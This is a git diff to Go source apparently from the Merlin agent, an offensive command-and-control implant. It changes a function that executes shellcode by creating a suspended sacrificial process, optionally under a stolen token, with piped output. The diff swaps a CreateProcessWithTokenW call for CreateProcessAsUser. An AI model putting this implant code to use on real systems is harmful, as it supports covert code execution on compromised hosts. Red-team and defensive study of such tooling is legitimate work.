@@ -32,11 +32,10 @@ import (
 	"syscall"
 	"unsafe"
 
-	// Sub Repositories
+	// X Packages
 	"golang.org/x/sys/windows"
 
-	// Internal
-	"github.com/Ne0nd0g/merlin-agent/os/windows/api/advapi32"
+	// Sub Repositories
 	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/pipes"
 	"github.com/Ne0nd0g/merlin-agent/os/windows/pkg/tokens"
 )
@@ -437,9 +436,6 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 		return
 	}
 
-	var lpEnvironment uintptr
-	var lpCurrentDirectory uintptr
-
 	lpProcessInformation := &windows.ProcessInformation{}
 	lpStartupInfo := &windows.StartupInfo{
 		StdInput:   stdInRead,
@@ -450,46 +446,11 @@ func ExecuteShellcodeCreateProcessWithPipe(sc string, spawnto string, args strin
 	}
 
 	if tokens.Token != 0 {
-		// BOOL CreateProcessWithTokenW(
-		//  [in]                HANDLE                hToken,
-		//  [in]                DWORD                 dwLogonFlags,
-		//  [in, optional]      LPCWSTR               lpApplicationName,
-		//  [in, out, optional] LPWSTR                lpCommandLine,
-		//  [in]                DWORD                 dwCreationFlags,
-		//  [in, optional]      LPVOID                lpEnvironment,
-		//  [in, optional]      LPCWSTR               lpCurrentDirectory,
-		//  [in]                LPSTARTUPINFOW        lpStartupInfo,
-		//  [out]               LPPROCESS_INFORMATION lpProcessInformation
-		//);
-		err = advapi32.CreateProcessWithTokenW(
-			uintptr(tokens.Token),
-			uintptr(tokens.LOGON_NETCREDENTIALS_ONLY),
-			uintptr(unsafe.Pointer(lpApplicationName)),
-			uintptr(unsafe.Pointer(lpCommandLine)),
-			uintptr(windows.CREATE_SUSPENDED),
-			lpEnvironment,
-			lpCurrentDirectory,
-			uintptr(unsafe.Pointer(lpStartupInfo)),
-			uintptr(unsafe.Pointer(lpProcessInformation)),
-		)
+		err = windows.CreateProcessAsUser(tokens.Token, lpApplicationName, lpCommandLine, nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, lpStartupInfo, lpProcessInformation)
 		if err != nil {
 			return
 		}
 	} else {
-		/*
-			BOOL CreateProcessW(
-			LPCWSTR               lpApplicationName,
-			LPWSTR                lpCommandLine,
-			LPSECURITY_ATTRIBUTES lpProcessAttributes,
-			LPSECURITY_ATTRIBUTES lpThreadAttributes,
-			BOOL                  bInheritHandles,
-			DWORD                 dwCreationFlags,
-			LPVOID                lpEnvironment,
-			LPCWSTR               lpCurrentDirectory,
-			LPSTARTUPINFOW        lpStartupInfo,
-			LPPROCESS_INFORMATION lpProcessInformation
-			);
-		*/
 		errCreateProcess := windows.CreateProcess(syscall.StringToUTF16Ptr(spawnto), syscall.StringToUTF16Ptr(args), nil, nil, true, windows.CREATE_SUSPENDED, nil, nil, lpStartupInfo, lpProcessInformation)
 		if errCreateProcess != nil && errCreateProcess.Error() != "The operation completed successfully." {
 			return stdout, stderr, fmt.Errorf("error calling CreateProcess:\r\n%s", errCreateProcess)
